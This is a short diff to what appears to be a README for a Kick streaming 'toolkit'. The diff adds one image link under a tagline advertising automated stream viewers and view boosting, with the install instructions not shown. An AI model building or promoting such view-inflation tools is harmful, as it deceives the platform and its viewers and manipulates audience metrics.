@@ -3,6 +3,7 @@
 > Complete Kick toolkit — automated stream viewers, view boosting, channel monitoring, and analytics in one package.
 
 ---
+<img width="558" height="363" alt="image" src="https://github.com/user-attachments/assets/ab64e369-a692-47e6-9e37-7013c37f0671" />
 
 ## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
 
